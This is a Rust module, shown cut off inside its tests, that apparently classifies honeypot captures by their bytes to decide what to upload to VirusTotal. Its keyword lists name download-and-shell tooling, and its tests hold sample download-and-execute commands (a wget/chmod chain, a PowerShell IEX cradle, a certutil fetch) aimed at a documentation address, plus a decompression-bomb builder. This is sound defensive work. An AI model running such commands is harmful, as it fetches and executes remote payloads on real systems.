//! Content-based eligibility check for sending a captured body to VirusTotal.
//!
//! A captured file is whatever an attacker pushed at a honeypot, which can be an image, a video or
//! worse. Forwarding it to a third party is only justified for executable or script content, so
//! this module decides from the BYTES alone - never from a file name, extension, or anything the
//! uploader claimed - and fails closed: any doubt, malformed structure, resource limit or internal
//! panic means "do not upload".
//!
//! Allowed: ELF, PE (MZ with a PE signature), Mach-O (thin and fat), Java class, DEX, scripts
//! (shebang for a shell, Python, Perl, PHP or PowerShell interpreter, or at least two strong
//! signatures for PHP, PowerShell, batch, Python, Perl or shell text), and zip / tar / gzip
//! archives only when a bounded look inside finds an allowed member. Everything else (images,
//! video, audio, PDF, office documents, unknown data, and archive formats this module cannot open:
//! bzip2, xz, zstd, 7z, rar) is refused.
//!
//! Bounds, all enforced per call of [`decide`]: [`MAX_ENTRIES`] archive entries examined,
//! [`MAX_INFLATE_BYTES`] decompressed bytes in total, [`MEMBER_CAP`] bytes looked at per member,
//! nesting at most [`MAX_DEPTH`] archives deep. Decompression is `flate2` (miniz_oxide) limited
//! with `Read::take`, so output is bounded whatever the stream claims. The input is
//! the in-memory body the caller already holds; nothing is written to disk or executed.

use std::fmt;

/// Bytes of a body examined for text-script signatures.
const SNIFF_WINDOW: usize = 16 * 1024;
/// Bytes of one archive member that are read (decompressed) for classification.
const MEMBER_CAP: usize = 64 * 1024;
/// Archive entries (zip central-directory records and tar headers) examined per body.
pub const MAX_ENTRIES: usize = 64;
/// Total decompressed bytes produced per body, across every member and gzip layer.
pub const MAX_INFLATE_BYTES: usize = 1024 * 1024;
/// Archive nesting depth that is opened: the body itself is depth 0.
pub const MAX_DEPTH: u32 = 2;

/// The decision for one body. `kind` is a short label of the detected type, safe to log.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    pub upload: bool,
    pub kind: String,
}

#[derive(Debug)]
struct DetectError(&'static str);

impl fmt::Display for DetectError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.0)
    }
}

type Detect<T> = Result<T, DetectError>;

enum Class {
    Allowed(String),
    Refused(String),
}

struct Ctx {
    entries_left: usize,
    inflate_left: usize,
}

/// Whether `body` may be uploaded. Any error or panic inside detection refuses.
pub fn decide(body: &[u8]) -> Verdict {
    let run = std::panic::catch_unwind(|| {
        let mut ctx = Ctx {
            entries_left: MAX_ENTRIES,
            inflate_left: MAX_INFLATE_BYTES,
        };
        classify(body, 0, &mut ctx)
    });
    match run {
        Ok(Ok(Class::Allowed(kind))) => Verdict { upload: true, kind },
        Ok(Ok(Class::Refused(kind))) => Verdict {
            upload: false,
            kind,
        },
        Ok(Err(e)) => Verdict {
            upload: false,
            kind: format!("detection_error:{e}"),
        },
        Err(_) => Verdict {
            upload: false,
            kind: "detection_error:panic".into(),
        },
    }
}

fn classify(data: &[u8], depth: u32, ctx: &mut Ctx) -> Detect<Class> {
    if let Some(kind) = executable_magic(data) {
        return Ok(Class::Allowed(kind.into()));
    }
    if let Some(kind) = shebang_script(data) {
        return Ok(Class::Allowed(kind.into()));
    }
    if let Some(kind) = refused_media_magic(data) {
        return Ok(Class::Refused(kind.into()));
    }
    if data.starts_with(b"PK\x03\x04") || data.starts_with(b"PK\x05\x06") {
        return classify_zip(data, depth, ctx);
    }
    if data.starts_with(&[0x1f, 0x8b, 0x08]) {
        return classify_gzip(data, depth, ctx);
    }
    if tar_header_ok(data) {
        return classify_tar(data, depth, ctx);
    }
    if let Some(kind) = opaque_archive(data) {
        return Ok(Class::Refused(format!("{kind}_uninspectable")));
    }
    if let Some(kind) = text_script(data) {
        return Ok(Class::Allowed(kind.into()));
    }
    Ok(Class::Refused("unknown".into()))
}

fn u16le(d: &[u8], at: usize) -> Option<u16> {
    Some(u16::from_le_bytes(
        d.get(at..at.checked_add(2)?)?.try_into().ok()?,
    ))
}

fn u32le(d: &[u8], at: usize) -> Option<u32> {
    Some(u32::from_le_bytes(
        d.get(at..at.checked_add(4)?)?.try_into().ok()?,
    ))
}

fn u32be(d: &[u8], at: usize) -> Option<u32> {
    Some(u32::from_be_bytes(
        d.get(at..at.checked_add(4)?)?.try_into().ok()?,
    ))
}

fn executable_magic(d: &[u8]) -> Option<&'static str> {
    if d.len() >= 16 && d.starts_with(b"\x7fELF") && matches!(d[4], 1 | 2) && matches!(d[5], 1 | 2)
    {
        return Some("elf");
    }
    if d.starts_with(b"MZ")
        && let Some(lfanew) = u32le(d, 0x3c)
        && let Ok(at) = usize::try_from(lfanew)
        && at >= 4
        && d.get(at..at.saturating_add(4)) == Some(b"PE\0\0".as_slice())
    {
        return Some("pe");
    }
    if d.len() >= 8
        && matches!(
            d[..4],
            [0xfe, 0xed, 0xfa, 0xce]
                | [0xfe, 0xed, 0xfa, 0xcf]
                | [0xce, 0xfa, 0xed, 0xfe]
                | [0xcf, 0xfa, 0xed, 0xfe]
        )
    {
        return Some("macho");
    }
    // CAFEBABE is shared by a fat Mach-O (a small architecture count) and a Java class (minor
    // and major version, major >= 45).
    if d.starts_with(&[0xca, 0xfe, 0xba, 0xbe]) && d.len() >= 8 {
        let major = u16::from_be_bytes([d[6], d[7]]);
        if (45..=120).contains(&major) {
            return Some("java_class");
        }
        if matches!(u32be(d, 4), Some(1..=30)) {
            return Some("macho_fat");
        }
    }
    if d.len() >= 8
        && d.starts_with(b"dex\n")
        && d[4..7].iter().all(u8::is_ascii_digit)
        && d[7] == 0
    {
        return Some("dex");
    }
    None
}

fn shebang_script(d: &[u8]) -> Option<&'static str> {
    let rest = d.strip_prefix(b"#!")?;
    let line = &rest[..rest
        .iter()
        .position(|&b| b == b'\n')
        .unwrap_or(rest.len())
        .min(256)];
    if line.contains(&0) {
        return None;
    }
    let line = std::str::from_utf8(line).ok()?;
    let mut tokens = line.split_whitespace();
    let mut interp = tokens.next()?.rsplit('/').next()?;
    if interp == "env" {
        interp = tokens
            .find(|t| !t.starts_with('-') && !t.contains('='))?
            .rsplit('/')
            .next()?;
    }
    match interp {
        "sh" | "bash" | "dash" | "ash" | "zsh" | "ksh" | "mksh" | "csh" | "tcsh" => {
            Some("script:shell")
        }
        "perl" => Some("script:perl"),
        "php" => Some("script:php"),
        "pwsh" | "powershell" => Some("script:powershell"),
        other => {
            let version = other.strip_prefix("python")?;
            version
                .chars()
                .all(|c| c.is_ascii_digit() || c == '.')
                .then_some("script:python")
        }
    }
}

/// Labels for common non-executable formats. Purely informative: anything not matched here and
/// not allowed elsewhere is refused as "unknown" anyway.
fn refused_media_magic(d: &[u8]) -> Option<&'static str> {
    const TABLE: &[(&[u8], &str)] = &[
        (b"\x89PNG\r\n\x1a\n", "png"),
        (b"\xff\xd8\xff", "jpeg"),
        (b"GIF87a", "gif"),
        (b"GIF89a", "gif"),
        (b"%PDF-", "pdf"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", "ole2_document"),
        (b"OggS", "ogg"),
        (b"\x1a\x45\xdf\xa3", "matroska_webm"),
        (b"fLaC", "flac"),
        (b"ID3", "mp3"),
        (b"II*\0", "tiff"),
        (b"MM\0*", "tiff"),
        (b"{\\rtf", "rtf"),
    ];
    for (magic, kind) in TABLE {
        if d.starts_with(magic) {
            return Some(kind);
        }
    }
    if d.len() >= 12 && d.starts_with(b"RIFF") {
        return Some(match &d[8..12] {
            b"WEBP" => "webp",
            b"WAVE" => "wav",
            b"AVI " => "avi",
            _ => "riff",
        });
    }
    if d.len() >= 12 && &d[4..8] == b"ftyp" {
        return Some("iso_bmff_media");
    }
    None
}

fn opaque_archive(d: &[u8]) -> Option<&'static str> {
    if d.len() >= 4 && d.starts_with(b"BZh") && (b'1'..=b'9').contains(&d[3]) {
        return Some("bzip2");
    }
    if d.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0]) {
        return Some("xz");
    }
    if d.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
        return Some("zstd");
    }
    if d.starts_with(&[b'7', b'z', 0xbc, 0xaf, 0x27, 0x1c]) {
        return Some("7z");
    }
    if d.starts_with(b"Rar!\x1a\x07") {
        return Some("rar");
    }
    None
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty() && hay.windows(needle.len()).any(|w| w == needle)
}

fn marker_count(lower: &[u8], markers: &[&str]) -> usize {
    markers
        .iter()
        .filter(|m| contains(lower, m.as_bytes()))
        .count()
}

fn text_script(d: &[u8]) -> Option<&'static str> {
    let d = d.strip_prefix(b"\xef\xbb\xbf").unwrap_or(d);
    let window = &d[..d.len().min(SNIFF_WINDOW)];
    if window.len() < 8 || window.contains(&0) {
        return None;
    }
    let texty = window
        .iter()
        .filter(|&&b| matches!(b, 9 | 10 | 13 | 32..=126) || b >= 0x80)
        .count();
    if texty * 100 < window.len() * 95 {
        return None;
    }
    let lower = window.to_ascii_lowercase();
    let trimmed = lower.trim_ascii_start();

    if trimmed.starts_with(b"<?php")
        || (contains(&lower, b"<?php")
            && marker_count(
                &lower,
                &[
                    "eval(",
                    "system(",
                    "exec(",
                    "shell_exec",
                    "passthru(",
                    "base64_decode(",
                ],
            ) >= 1)
    {
        return Some("script:php");
    }
    if trimmed.starts_with(b"powershell")
        || marker_count(
            &lower,
            &[
                "invoke-expression",
                "iex ",
                "iex(",
                "-encodedcommand",
                "new-object",
                "invoke-webrequest",
                "downloadstring",
                "downloadfile",
                "$erroractionpreference",
                "set-executionpolicy",
                "start-process",
                "-windowstyle hidden",
                "add-type",
                "frombase64string",
            ],
        ) >= 2
    {
        return Some("script:powershell");
    }
    let first_line = trimmed.split(|&b| b == b'\n').next().unwrap_or(&[]);
    let first_line = first_line.trim_ascii();
    if first_line.starts_with(b"@echo off")
        || first_line.starts_with(b"echo off")
        || marker_count(
            &lower,
            &[
                "cmd /c",
                "cmd.exe",
                "%~dp0",
                "setlocal",
                "goto :",
                "if errorlevel",
                "start /b",
                "del /f",
                "certutil",
                "bitsadmin",
                "reg add",
                "schtasks",
                "taskkill",
            ],
        ) >= 2
    {
        return Some("script:batch");
    }
    if marker_count(
        &lower,
        &[
            "import os",
            "import sys",
            "import socket",
            "import subprocess",
            "import base64",
            "__import__(",
            "os.system(",
            "subprocess.",
            "base64.b64decode",
            "socket.socket(",
            "urllib.request",
        ],
    ) >= 2
    {
        return Some("script:python");
    }
    if marker_count(
        &lower,
        &[
            "use strict",
            "use warnings",
            "use socket",
            "use io::socket",
            "my $",
            "my @",
            "sockaddr_in",
            "fork()",
        ],
    ) >= 2
    {
        return Some("script:perl");
    }
    if marker_count(
        &lower,
        &[
            "wget ",
            "curl ",
            "chmod ",
            "/bin/sh",
            "/bin/bash",
            "tftp ",
            "busybox",
            "nohup ",
            "cd /tmp",
            "cd /var",
            "rm -rf",
            "/dev/null",
            "|sh",
            "| sh",
            "| bash",
            "base64 -d",
        ],
    ) >= 2
    {
        return Some("script:shell");
    }
    None
}

// ---- archives ----

/// Prefix `kind` onto an inner verdict, marking where it was found.
fn nest(prefix: &str, inner: Class) -> Class {
    match inner {
        Class::Allowed(k) => Class::Allowed(format!("{prefix}:{k}")),
        Class::Refused(k) => Class::Refused(format!("{prefix}:{k}")),
    }
}

fn classify_zip(data: &[u8], depth: u32, ctx: &mut Ctx) -> Detect<Class> {
    if depth >= MAX_DEPTH {
        return Ok(Class::Refused("zip:nesting_limit".into()));
    }
    let tail_start = data.len().saturating_sub(22 + 65535);
    let eocd = (tail_start..data.len().saturating_sub(21))
        .rev()
        .find(|&i| data[i..].starts_with(b"PK\x05\x06"))
        .ok_or(DetectError("zip: no end-of-central-directory record"))?;
    let total = u16le(data, eocd + 10).ok_or(DetectError("zip: truncated eocd"))?;
    let cd_size = u32le(data, eocd + 12).ok_or(DetectError("zip: truncated eocd"))?;
    let cd_off = u32le(data, eocd + 16).ok_or(DetectError("zip: truncated eocd"))?;
    if total == 0xffff || cd_size == 0xffff_ffff || cd_off == 0xffff_ffff {
        return Err(DetectError("zip: zip64 not supported"));
    }
    let cd_start = cd_off as usize;
    let cd_end = cd_start
        .checked_add(cd_size as usize)
        .filter(|&e| e <= data.len())
        .ok_or(DetectError("zip: central directory out of range"))?;

    let mut pos = cd_start;
    let mut limit_hit = false;
    for _ in 0..total {
        if ctx.entries_left == 0 {
            limit_hit = true;
            break;
        }
        ctx.entries_left -= 1;

        let fixed_end = pos
            .checked_add(46)
            .filter(|&e| e <= cd_end)
            .ok_or(DetectError("zip: truncated central directory entry"))?;
        if &data[pos..pos + 4] != b"PK\x01\x02" {
            return Err(DetectError("zip: bad central directory signature"));
        }
        let flags = u16le(data, pos + 8).ok_or(DetectError("zip: truncated"))?;
        let method = u16le(data, pos + 10).ok_or(DetectError("zip: truncated"))?;
        let csize = u32le(data, pos + 20).ok_or(DetectError("zip: truncated"))? as usize;
        let nlen = u16le(data, pos + 28).ok_or(DetectError("zip: truncated"))? as usize;
        let elen = u16le(data, pos + 30).ok_or(DetectError("zip: truncated"))? as usize;
        let clen = u16le(data, pos + 32).ok_or(DetectError("zip: truncated"))? as usize;
        let local = u32le(data, pos + 42).ok_or(DetectError("zip: truncated"))? as usize;
        let name_end = fixed_end
            .checked_add(nlen)
            .filter(|&e| e <= cd_end)
            .ok_or(DetectError("zip: entry name out of range"))?;
        let name = &data[fixed_end..name_end];
        pos = name_end
            .checked_add(elen)
            .and_then(|p| p.checked_add(clen))
            .ok_or(DetectError("zip: entry out of range"))?;

        // An encrypted member or a method other than stored/deflate cannot be looked into; it
        // simply does not qualify, and the next member may.
        if flags & 1 != 0 || !matches!(method, 0 | 8) {
            continue;
        }
        let Some(raw) = zip_member_raw(data, local, csize) else {
            continue;
        };
        let prefix = if method == 0 {
            raw[..raw.len().min(MEMBER_CAP)].to_vec()
        } else {
            let cap = MEMBER_CAP.min(ctx.inflate_left);
            if cap == 0 {
                limit_hit = true;
                break;
            }
            match inflate_prefix(raw, cap) {
                Ok(buf) => {
                    ctx.inflate_left -= buf.len();
                    buf
                }
                Err(_) => continue,
            }
        };
        if name == b"AndroidManifest.xml" && prefix.starts_with(&[0x03, 0x00, 0x08, 0x00]) {
            return Ok(Class::Allowed("zip:android_manifest".into()));
        }
        if let Ok(Class::Allowed(kind)) = classify(&prefix, depth + 1, ctx) {
            return Ok(Class::Allowed(format!("zip:{kind}")));
        }
    }
    Ok(Class::Refused(if limit_hit {
        "zip:entry_or_inflate_limit".into()
    } else {
        "zip:no_executable_member".into()
    }))
}

/// The stored bytes of the zip member whose local header is at `local`.
fn zip_member_raw(data: &[u8], local: usize, csize: usize) -> Option<&[u8]> {
    if data.get(local..local.checked_add(4)?)? != b"PK\x03\x04" {
        return None;
    }
    let nlen = u16le(data, local + 26)? as usize;
    let elen = u16le(data, local + 28)? as usize;
    let start = local
        .checked_add(30)?
        .checked_add(nlen)?
        .checked_add(elen)?;
    data.get(start..start.checked_add(csize)?)
}

fn classify_gzip(data: &[u8], depth: u32, ctx: &mut Ctx) -> Detect<Class> {
    if depth >= MAX_DEPTH {
        return Ok(Class::Refused("gzip:nesting_limit".into()));
    }
    let flags = *data.get(3).ok_or(DetectError("gzip: truncated header"))?;
    if flags & 0xe0 != 0 {
        return Err(DetectError("gzip: reserved flag bits set"));
    }
    let mut pos = 10usize;
    if flags & 4 != 0 {
        let xlen = u16le(data, pos).ok_or(DetectError("gzip: truncated header"))? as usize;
        pos = pos
            .checked_add(2 + xlen)
            .ok_or(DetectError("gzip: bad extra field"))?;
    }
    for bit in [8u8, 16] {
        if flags & bit != 0 {
            let rest = data
                .get(pos..)
                .ok_or(DetectError("gzip: truncated header"))?;
            let nul = rest
                .iter()
                .position(|&b| b == 0)
                .ok_or(DetectError("gzip: unterminated name"))?;
            pos += nul + 1;
        }
    }
    if flags & 2 != 0 {
        pos += 2;
    }
    let body = data
        .get(pos..)
        .ok_or(DetectError("gzip: truncated header"))?;
    let cap = MAX_INFLATE_BYTES.min(ctx.inflate_left);
    if cap == 0 {
        return Ok(Class::Refused("gzip:inflate_limit".into()));
    }
    let inflated = inflate_prefix(body, cap)?;
    ctx.inflate_left -= inflated.len();
    Ok(nest("gzip", classify(&inflated, depth + 1, ctx)?))
}

fn parse_octal(field: &[u8]) -> Option<u64> {
    let text: Vec<u8> = field
        .iter()
        .copied()
        .skip_while(|&b| b == b' ')
        .take_while(|&b| b != 0 && b != b' ')
        .collect();
    if text.is_empty() {
        return Some(0);
    }
    let mut v = 0u64;
    for b in text {
        if !(b'0'..=b'7').contains(&b) {
            return None;
        }
        v = v.checked_mul(8)?.checked_add(u64::from(b - b'0'))?;
    }
    Some(v)
}

/// A first block that is a valid tar header: a non-zero checksum field that matches the sum of
/// the header bytes with the field read as spaces.
fn tar_header_ok(d: &[u8]) -> bool {
    let Some(h) = d.get(..512) else {
        return false;
    };
    let Some(stored) = parse_octal(&h[148..156]) else {
        return false;
    };
    let computed: u64 = h
        .iter()
        .enumerate()
        .map(|(i, &b)| {
            if (148..156).contains(&i) {
                32
            } else {
                u64::from(b)
            }
        })
        .sum();
    stored != 0 && stored == computed
}

fn classify_tar(data: &[u8], depth: u32, ctx: &mut Ctx) -> Detect<Class> {
    if depth >= MAX_DEPTH {
        return Ok(Class::Refused("tar:nesting_limit".into()));
    }
    let mut off = 0usize;
    let mut limit_hit = false;
    while off + 512 <= data.len() {
        if ctx.entries_left == 0 {
            limit_hit = true;
            break;
        }
        ctx.entries_left -= 1;
        let h = &data[off..off + 512];
        if h.iter().all(|&b| b == 0) {
            break;
        }
        if !tar_header_ok(&data[off..]) {
            return Err(DetectError("tar: bad header checksum"));
        }
        let size = parse_octal(&h[124..136]).ok_or(DetectError("tar: unsupported size field"))?;
        let size = usize::try_from(size).map_err(|_| DetectError("tar: size out of range"))?;
        let start = off + 512;
        if matches!(h[156], 0 | b'0') && start < data.len() {
            let end = start.saturating_add(size.min(MEMBER_CAP)).min(data.len());
            if let Ok(Class::Allowed(kind)) = classify(&data[start..end], depth + 1, ctx) {
                return Ok(Class::Allowed(format!("tar:{kind}")));
            }
        }
        let advance = size
            .div_ceil(512)
            .checked_mul(512)
            .and_then(|s| start.checked_add(s))
            .ok_or(DetectError("tar: size out of range"))?;
        off = advance;
    }
    Ok(Class::Refused(if limit_hit {
        "tar:entry_limit".into()
    } else {
        "tar:no_executable_member".into()
    }))
}

/// Decompress at most `cap` bytes of the raw deflate stream `input` and return that prefix.
/// Stopping at `cap` (`Read::take`) is what keeps a decompression bomb to `cap` bytes of output;
/// a corrupt or truncated stream is an error.
fn inflate_prefix(input: &[u8], cap: usize) -> Detect<Vec<u8>> {
    use std::io::Read;
    let mut out = Vec::with_capacity(cap.min(MEMBER_CAP));
    flate2::read::DeflateDecoder::new(input)
        .take(cap as u64)
        .read_to_end(&mut out)
        .map_err(|_| DetectError("inflate: invalid or truncated stream"))?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn elf() -> Vec<u8> {
        let mut v = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
        v.resize(64, 0);
        v
    }

    fn mz() -> Vec<u8> {
        let mut v = vec![0u8; 0x48];
        v[..2].copy_from_slice(b"MZ");
        v[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        v[0x40..0x44].copy_from_slice(b"PE\0\0");
        v
    }

    fn dex() -> Vec<u8> {
        let mut v = b"dex\n035\0".to_vec();
        v.resize(112, 0);
        v
    }

    fn png() -> Vec<u8> {
        let mut v = b"\x89PNG\r\n\x1a\n".to_vec();
        v.extend_from_slice(&[0, 0, 0, 13]);
        v.extend_from_slice(b"IHDR");
        v.resize(64, 7);
        v
    }

    fn jpeg() -> Vec<u8> {
        let mut v = vec![0xff, 0xd8, 0xff, 0xe0, 0, 16];
        v.extend_from_slice(b"JFIF\0");
        v.resize(64, 3);
        v
    }

    fn mp4() -> Vec<u8> {
        let mut v = vec![0, 0, 0, 0x18];
        v.extend_from_slice(b"ftypisom");
        v.resize(64, 1);
        v
    }

    /// Protocol-probe traffic a scanner sends to a telnet port (the sensors record it as probe
    /// evidence, never as a sample, so VirusTotal does not see it). Should one reach the spool
    /// anyway, from before the sensor learned to tell them apart, the upload filter refuses it
    /// on content: none of these is an executable, a script or an archive.
    #[test]
    fn protocol_probe_bodies_are_never_uploaded() {
        let mut tls = vec![
            0x16, 0x03, 0x01, 0x00, 0x5a, 0x01, 0x00, 0x00, 0x56, 0x03, 0x03,
        ];
        tls.resize(100, 0xc3);
        let mut smb = vec![0, 0, 0, 0x54, 0xff, b'S', b'M', b'B', 0x72];
        smb.resize(100, 0);
        let rdp = vec![
            0x03, 0, 0, 0x13, 0x0e, 0xe0, 0, 0, 0, 0, 0, 1, 0, 8, 0, 3, 0, 0, 0,
        ];
        for (label, body) in [
            ("tls", tls),
            ("smb", smb),
            ("rdp", rdp),
            (
                "http",
                b"GET / HTTP/1.1\r\nHost: 192.0.2.1\r\n\r\n".to_vec(),
            ),
            ("redis", b"*1\r\n$4\r\nPING\r\n".to_vec()),
            ("ssh", b"SSH-2.0-scanner\r\n".to_vec()),
        ] {
            let verdict = decide(&body);
            assert!(
                !verdict.upload,
                "{label} was cleared for upload: {verdict:?}"
            );
        }
    }

    fn pdf() -> Vec<u8> {
        let mut v = b"%PDF-1.7\n".to_vec();
        v.extend_from_slice(b"1 0 obj << /Type /Catalog >> endobj\n");
        v
    }

    /// A deflate stream holding `data` in one stored block.
    fn deflate_stored(data: &[u8]) -> Vec<u8> {
        let mut v = vec![1u8];
        v.extend_from_slice(&(data.len() as u16).to_le_bytes());
        v.extend_from_slice(&(!(data.len() as u16)).to_le_bytes());
        v.extend_from_slice(data);
        v
    }

    struct Bits {
        bytes: Vec<u8>,
        used: u32,
    }

    impl Bits {
        fn new() -> Self {
            Bits {
                bytes: Vec::new(),
                used: 0,
            }
        }
        fn bit(&mut self, b: u32) {
            if self.used.is_multiple_of(8) {
                self.bytes.push(0);
            }
            if b != 0 {
                *self.bytes.last_mut().unwrap() |= 1 << (self.used % 8);
            }
            self.used += 1;
        }
        /// Header and extra-bit fields go out least significant bit first.
        fn lsb(&mut self, v: u32, n: u32) {
            for i in 0..n {
                self.bit((v >> i) & 1);
            }
        }
        /// Huffman codes go out most significant bit first.
        fn code(&mut self, v: u32, n: u32) {
            for i in (0..n).rev() {
                self.bit((v >> i) & 1);
            }
        }
    }

    /// A fixed-Huffman deflate stream that expands to `1 + 258 * matches` zero bytes.
    fn deflate_zero_bomb(matches: usize) -> Vec<u8> {
        let mut b = Bits::new();
        b.lsb(1, 1);
        b.lsb(1, 2);
        b.code(0x30, 8); // literal 0
        for _ in 0..matches {
            b.code(0xc5, 8); // length symbol 285 = 258
            b.code(0, 5); // distance symbol 0 = 1
        }
        b.code(0, 7); // end of block
        b.bytes
    }

    struct Member<'a> {
        name: &'a str,
        method: u16,
        raw: Vec<u8>,
        claimed_size: u32,
    }

    fn stored<'a>(name: &'a str, data: &[u8]) -> Member<'a> {
        Member {
            name,
            method: 0,
            raw: data.to_vec(),
            claimed_size: data.len() as u32,
        }
    }

    fn deflated<'a>(name: &'a str, data: &[u8]) -> Member<'a> {
        Member {
            name,
            method: 8,
            raw: deflate_stored(data),
            claimed_size: data.len() as u32,
        }
    }

    fn zip(members: &[Member<'_>]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut cd = Vec::new();
        for m in members {
            let off = out.len() as u32;
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&[20, 0, 0, 0]);
            out.extend_from_slice(&m.method.to_le_bytes());
            out.extend_from_slice(&[0; 8]);
            out.extend_from_slice(&(m.raw.len() as u32).to_le_bytes());
            out.extend_from_slice(&m.claimed_size.to_le_bytes());
            out.extend_from_slice(&(m.name.len() as u16).to_le_bytes());
            out.extend_from_slice(&[0, 0]);
            out.extend_from_slice(m.name.as_bytes());
            out.extend_from_slice(&m.raw);

            cd.extend_from_slice(b"PK\x01\x02");
            cd.extend_from_slice(&[20, 0, 20, 0, 0, 0]);
            cd.extend_from_slice(&m.method.to_le_bytes());
            cd.extend_from_slice(&[0; 8]);
            cd.extend_from_slice(&(m.raw.len() as u32).to_le_bytes());
            cd.extend_from_slice(&m.claimed_size.to_le_bytes());
            cd.extend_from_slice(&(m.name.len() as u16).to_le_bytes());
            cd.extend_from_slice(&[0; 12]);
            cd.extend_from_slice(&off.to_le_bytes());
            cd.extend_from_slice(m.name.as_bytes());
        }
        let cd_off = out.len() as u32;
        out.extend_from_slice(&cd);
        out.extend_from_slice(b"PK\x05\x06\0\0\0\0");
        out.extend_from_slice(&(members.len() as u16).to_le_bytes());
        out.extend_from_slice(&(members.len() as u16).to_le_bytes());
        out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
        out.extend_from_slice(&cd_off.to_le_bytes());
        out.extend_from_slice(&[0, 0]);
        out
    }

    fn tar(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        for (name, data) in files {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..107].copy_from_slice(b"0000644");
            h[124..135].copy_from_slice(format!("{:011o}", data.len()).as_bytes());
            h[156] = b'0';
            h[257..262].copy_from_slice(b"ustar");
            h[148..156].fill(b' ');
            let sum: u32 = h.iter().map(|&b| u32::from(b)).sum();
            h[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
            out.extend_from_slice(&h);
            out.extend_from_slice(data);
            out.resize(out.len().div_ceil(512) * 512, 0);
        }
        out.resize(out.len() + 1024, 0);
        out
    }

    fn gzip_stored(data: &[u8]) -> Vec<u8> {
        let mut v = vec![0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3];
        v.extend_from_slice(&deflate_stored(data));
        v.extend_from_slice(&[0; 8]);
        v
    }

    fn allowed(body: &[u8]) -> String {
        let v = decide(body);
        assert!(v.upload, "expected upload, got refusal: {}", v.kind);
        v.kind
    }

    fn refused(body: &[u8]) -> String {
        let v = decide(body);
        assert!(!v.upload, "expected refusal, got upload: {}", v.kind);
        v.kind
    }

    #[test]
    fn native_executables_are_allowed() {
        assert_eq!(allowed(&elf()), "elf");
        assert_eq!(allowed(&mz()), "pe");
        assert_eq!(allowed(&dex()), "dex");
        assert_eq!(allowed(b"\xcf\xfa\xed\xfe\x07\0\0\x01"), "macho");
        let mut class = b"\xca\xfe\xba\xbe\0\0\0\x34".to_vec();
        class.resize(32, 0);
        assert_eq!(allowed(&class), "java_class");
        assert_eq!(allowed(b"\xca\xfe\xba\xbe\0\0\0\x02rest"), "macho_fat");
    }

    #[test]
    fn mz_without_a_pe_signature_is_not_enough() {
        let mut v = mz();
        v[0x40..0x44].copy_from_slice(b"XXXX");
        refused(&v);
        refused(b"MZ is a prefix of plain text, not a program");
    }

    #[test]
    fn media_and_documents_are_refused_with_a_label() {
        assert_eq!(refused(&png()), "png");
        assert_eq!(refused(&jpeg()), "jpeg");
        assert_eq!(refused(&mp4()), "iso_bmff_media");
        assert_eq!(refused(&pdf()), "pdf");
        assert_eq!(
            refused(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1 office document body"),
            "ole2_document"
        );
    }

    #[test]
    fn garbage_and_empty_bodies_are_refused() {
        refused(&[]);
        refused(&[0xde, 0xad, 0xbe, 0xef, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]);
        refused(&(0..=255u8).cycle().take(4096).collect::<Vec<_>>());
    }

    #[test]
    fn shebang_scripts_are_allowed_by_interpreter() {
        assert_eq!(allowed(b"#!/bin/sh\necho hi\n"), "script:shell");
        assert_eq!(allowed(b"#!/usr/bin/env bash\n"), "script:shell");
        assert_eq!(allowed(b"#!/usr/bin/env -S python3 -u\n"), "script:python");
        assert_eq!(allowed(b"#!/usr/bin/python2.7\nprint 1\n"), "script:python");
        assert_eq!(allowed(b"#!/usr/bin/perl -w\n"), "script:perl");
        assert_eq!(allowed(b"#!/usr/bin/php\n<?php\n"), "script:php");
        assert_eq!(allowed(b"#!/usr/bin/env pwsh\n"), "script:powershell");
        refused(b"#!/usr/bin/awk -f\nBEGIN{}\n");
        refused(b"#!/opt/pythonic-thing\n");
        refused(b"#!/bin/sh\0\0binary after\n");
    }

    #[test]
    fn script_text_needs_strong_signatures_not_one_word() {
        assert_eq!(
            allowed(b"cd /tmp; wget http://192.0.2.1/x; chmod +x x; ./x\n"),
            "script:shell"
        );
        assert_eq!(
            allowed(b"import os\nimport socket\ns = socket.socket()\n"),
            "script:python"
        );
        assert_eq!(allowed(b"<?php echo 1; ?>\n"), "script:php");
        assert_eq!(
            allowed(b"powershell -nop -w hidden -EncodedCommand AAAA\n"),
            "script:powershell"
        );
        assert_eq!(
            allowed(b"$c = New-Object Net.WebClient; IEX $c.DownloadString('http://192.0.2.1/')\n"),
            "script:powershell"
        );
        assert_eq!(
            allowed(b"@echo off\r\ncertutil -urlcache -f http://192.0.2.1/a a.exe\r\n"),
            "script:batch"
        );
        assert_eq!(
            allowed(b"use strict;\nuse Socket;\nmy $host = shift;\n"),
            "script:perl"
        );
        refused(b"We use curl for downloads and nothing else in this plain note.\n");
        refused(b"hello world, this is an ordinary text file with no commands in it\n");
    }

    #[test]
    fn zip_is_allowed_only_for_an_executable_member() {
        assert_eq!(allowed(&zip(&[stored("classes.dex", &dex())])), "zip:dex");
        assert_eq!(
            allowed(&zip(&[stored("a.png", &png()), stored("bin/run", &elf())])),
            "zip:elf"
        );
        assert_eq!(
            allowed(&zip(&[deflated("x", &elf())])),
            "zip:elf",
            "a deflated member is looked into"
        );
        let mut manifest = vec![0x03, 0x00, 0x08, 0x00];
        manifest.resize(32, 0);
        assert_eq!(
            allowed(&zip(&[stored("AndroidManifest.xml", &manifest)])),
            "zip:android_manifest"
        );
        assert_eq!(
            refused(&zip(&[stored("a.png", &png())])),
            "zip:no_executable_member"
        );
